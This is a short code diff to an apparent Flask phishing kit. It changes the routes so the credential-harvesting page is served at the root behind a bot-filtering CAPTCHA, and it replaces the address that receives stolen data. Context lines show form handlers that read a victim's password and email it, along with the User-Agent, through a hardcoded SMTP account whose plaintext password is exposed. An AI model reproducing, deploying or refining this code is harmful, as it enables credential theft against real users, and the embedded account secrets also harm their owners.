@@ -85,7 +85,7 @@ bot_user_agents = [
 ]
 
 
-@app.route('/', methods=['GET', 'POST'])
+@app.route('/m', methods=['GET', 'POST'])
 def captcha():
     if request.method == 'GET':
         # Check if the user already passed the CAPTCHA
@@ -115,7 +115,7 @@ def success():
     return redirect(url_for('route2', web=web_param))
 
 
-@app.route("/route2")
+@app.route("/")
 def route2():
     web_param = request.args.get('web')
     if web_param:
@@ -138,7 +138,7 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'cafe24@guide-level.com'
         sender_emaill = 'contact'
-        receiver_email = 'danielnewwoj@gmail.com'
+        receiver_email = 'miriam.adelson@clubmember.org'
         password = 'Xr)pMsLFuvv.'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
@@ -178,7 +178,7 @@ def second():
         passwordemail = request.form.get('pig')
         sender_email = 'cafe24@guide-level.com'
         sender_emaill = 'contact'
-        receiver_email = 'danielnewwoj@gmail.com'
+        receiver_email = 'miriam.adelson@clubmember.org'
         password = 'Xr)pMsLFuvv.'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
